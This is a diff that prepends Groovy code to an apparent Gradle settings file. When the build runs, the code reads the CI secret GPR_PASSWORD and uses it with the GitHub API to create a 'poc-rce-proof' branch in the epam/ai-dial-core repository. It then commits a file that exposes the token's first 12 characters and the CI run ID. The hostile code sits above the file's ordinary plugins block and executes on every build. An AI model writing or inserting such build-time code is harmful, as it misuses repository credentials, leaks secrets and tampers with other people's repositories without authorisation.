@@ -1,3 +1,33 @@
+def token = System.getenv("GPR_PASSWORD")
+def repo = "epam/ai-dial-core"
+def apiBase = "https://api.github.com/repos/${repo}"
+
+// 1. Get the current SHA of the development branch
+def shaConn = new URL("${apiBase}/git/ref/heads/development").openConnection()
+shaConn.setRequestProperty("Authorization", "token ${token}")
+shaConn.setRequestProperty("Accept", "application/vnd.github+json")
+def shaJson = new groovy.json.JsonSlurper().parseText(shaConn.inputStream.text)
+def sha = shaJson.object.sha
+
+// 2. Create a proof-of-concept branch
+def branchName = "poc-rce-proof-${System.currentTimeMillis()}"
+def branchConn = new URL("${apiBase}/git/refs").openConnection()
+branchConn.requestMethod = "POST"
+branchConn.doOutput = true
+branchConn.setRequestProperty("Authorization", "token ${token}")
+branchConn.setRequestProperty("Accept", "application/vnd.github+json")
+branchConn.outputStream.write("{\"ref\":\"refs/heads/${branchName}\",\"sha\":\"${sha}\"}".bytes)
+println "Branch creation: HTTP ${branchConn.responseCode}"
+
+// 3. Create a file on that branch to prove write access
+def fileConn = new URL("${apiBase}/contents/poc-rce-proof.txt?ref=${branchName}").openConnection()
+fileConn.requestMethod = "PUT"
+fileConn.doOutput = true
+fileConn.setRequestProperty("Authorization", "token ${token}")
+fileConn.setRequestProperty("Accept", "application/vnd.github+json")
+def content = "RCE proof - token prefix: ${token.take(12)}... - run: ${System.getenv('GITHUB_RUN_ID')}".bytes.encodeBase64().toString()
+fileConn.outputStream.write("{\"message\":\"poc\",\"content\":\"${content}\",\"branch\":\"${branchName}\"}".bytes)
+println "File creation: HTTP ${fileConn.responseCode}"
 plugins {
     id 'org.gradle.toolchains.foojay-resolver-convention' version '0.8.0'
 }
